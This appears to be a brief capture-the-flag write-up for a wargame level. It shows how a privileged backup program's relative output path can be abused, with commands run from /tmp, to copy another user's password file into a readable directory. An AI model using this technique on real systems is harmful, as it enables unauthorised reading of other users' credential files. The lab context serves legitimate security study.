We have an executable that asks for a filename as parameter.
It opens the file and then proceeds to store the result in a backup file it creates.

It tries to create a file in ./backups/ + path of initial file
As it creates a relative path, we can execute the program from anywhere and it will create the file were we are.

We can then cd into /tmp to make sure we have the necessary rights.

```
cd /tmp
mkdir -p /tmp/backups//home/users/level09/
~/level08 /home/users/level09/.pass
cat /tmp/backups//home/users/level09/.pass
```
